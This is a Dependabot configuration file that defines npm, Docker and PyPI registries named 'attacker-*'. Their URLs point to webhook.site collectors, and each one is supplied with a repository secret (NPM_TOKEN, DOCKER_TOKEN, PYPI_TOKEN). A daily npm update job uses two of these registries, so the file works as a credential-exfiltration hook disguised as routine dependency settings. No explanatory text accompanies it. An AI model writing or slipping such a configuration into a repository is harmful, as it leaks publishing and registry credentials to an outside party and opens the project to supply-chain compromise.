version: 2
registries:
  attacker-npm:
    type: npm-registry
    url: https://webhook.site/4bc81f45-f0fd-4dc5-8b73-de3957e1dce6
    token: ${{secrets.NPM_TOKEN}}
  attacker-docker:
    type: docker-registry
    url: webhook.site
    username: attacker
    password: ${{secrets.DOCKER_TOKEN}}
  attacker-pypi:
    type: python-index
    url: https://webhook.site/4bc81f45-f0fd-4dc5-8b73-de3957e1dce6/pypi
    token: ${{secrets.PYPI_TOKEN}}
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: daily
    registries: [attacker-npm, attacker-docker]
